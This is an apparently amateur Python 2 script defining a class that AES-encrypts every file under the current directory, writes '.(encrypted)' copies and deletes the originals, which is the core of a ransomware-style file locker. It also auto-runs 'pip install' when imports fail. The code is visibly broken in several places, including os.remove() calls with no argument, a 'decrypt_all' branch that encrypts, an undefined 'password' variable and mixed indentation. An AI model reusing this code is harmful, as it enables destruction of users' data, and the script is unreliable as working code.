1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
#!/usr/bin/python

import os
try:
	import sys
	import pip
	import random
	import platform
	import pkg_resources
	from Crypto.Hash import SHA256
	from Crypto.Cipher import AES
except ImportError as e:
	pip = lambda : os.system('pip install' + str(e)[15:])
	pip()


class RAW:

	_chunk = None
	_identifier = None
	_ = None
	

	# constructor
	def __init__(self):
		self.init()

	# initializer
	def init(cls):
		cls._chunk = 65 * 1024
		cls._identifier = ".(encrypted)"
		cls._ = None

	# encrypt file using a key
	def encrypt(cls, key, filename):
		cls._chunk = 65 * 1024
		out_file = os.path.join(os.path.dirname(filename), cls._identifier + os.path.basename(filename))
		file_size = str(os.path.getsize(filename)).zfill(16)
		IV = ''
		for i in range(16):
			IV += chr(random.randint(0, 0xFF))

		cls._ = AES.new(key, AES.MODE_CBC, IV)
		with open(filename, 'rb') as i_file:
			with open(out_file, 'wb') as o_file:
				o_file.write(filename)
				o_file.write(IV)
				while True:
					chunk = i_file.read(cls._chunk)
					if(len(chunk) == 0):
						break
					elif(len(chunk) % 16 != 0):
						chunk += ' ' * (16 - (len(chunk) % 16))

					o_file.write(cls._.encrypt(chunk))

			
	# decrypt a file using a key
	def decrypt(cls, key, filename):
		out_file = os.path.join(os.path.dirname(filename), os.path.basename(filename[12:]))
		with open(filename, 'rb') as i_file:
			file_size = i_file.read(16)
			IV = i_file.read(16)

		cls._ = AES.new(key, AES.MODE_CBC, IV)
		with open(out_file, 'wb') as o_file:
			while True:
				chunk = i_file.read(cls._chunk)
				if(len(chunk) == 0):
					break

				o_file.write(cls._.decrypt(chunk))
			o_file.truncate(int(file_size))


	# sort files
	def file_sort(cls):
		all_files = []
		for root, subfolders, files in os.walk(os.getcwd()):
			for names in files:
				all_files.append(os.path.join(root, names))

		return all_files

	# AES handler
	def handler(cls, flag, key):
		# encryption section (ALL FILES)
		if(flag == 'encrypt-all'):
			sorted_files = file_sort()
			for f in sorted_files:
			    if(os.path.basename(f).startswith(".(encrypted)")):			      
			        return "<!> '{}' is already encrypted".format(str(f))

			    elif(f == os.path.join(os.getcwd(), sys.argv[0])):
			        pass        
			    else:
			        cls.encrypt(SHA256.new(key).digest(), str(f))
			        os.remove()                                   
			        return "<!> Done encrypting '{}'".format(str(f))
	    
		# encryption section (SINGLE FILE)
		elif(flag == 'encrypt'):
			filename = raw_input(" Enter the filename to encrypt: ")
		    if(not os.path.exists(filename)):
		    	return "<!> The file '{}' does not exist".format(str(filename))
		    	
		    elif(filename.startswith(".(encrypted)")):
		    	return "<!> '{}' is already encrypted".format(str(filename))
			   			      
		    else:
		    	cls.encrypt(SHA256.new(key).digest(), str(filename))
		    	os.remove()                                   
		    	return "<!> Done encrypting '{}'".format(str(filename))
	    
	    # decryption section (ALL FILES)
	    elif(flag == 'decrypt_all'):
	    	sorted_files = file_sort()
			for f in sorted_files:
			    if(not os.path.basename(f).startswith(".(encrypted)")):			      
			        return "<!> '{}' is already encrypted".format(str(f))

			    elif(f == os.path.join(os.getcwd(), sys.argv[0])):
			        pass        
			    else:
			        cls.encrypt(SHA256.new(key).digest(), str(f))
			        os.remove()                                   
			        return "<!> Done encrypting '{}'".format(str(f))

	    # decryption section (SINGLE FILE)
	    elif(flag == 'decrypt'):
	    	filename = raw_input(" Enter the filename to decrypt: ")
		    if(not os.path.exists(filename)):
		    	return "<!> The file '{}' does not exist".format(str(filename))
		    	
		    elif(not filename.startswith(".(encrypted)")):
		       	return "<!> '{}' is already not encrypted".format(str(filename))
			   			      
		    else:
		       cls.decrypt(SHA256.new(password).digest(), filename)
		       os.remove(filename)                            
		       return "<!> Done decrypting '{}'".format(str(f))		       
	    else:
	    	print "<!> '{}' is not an option!".format(str(flag))

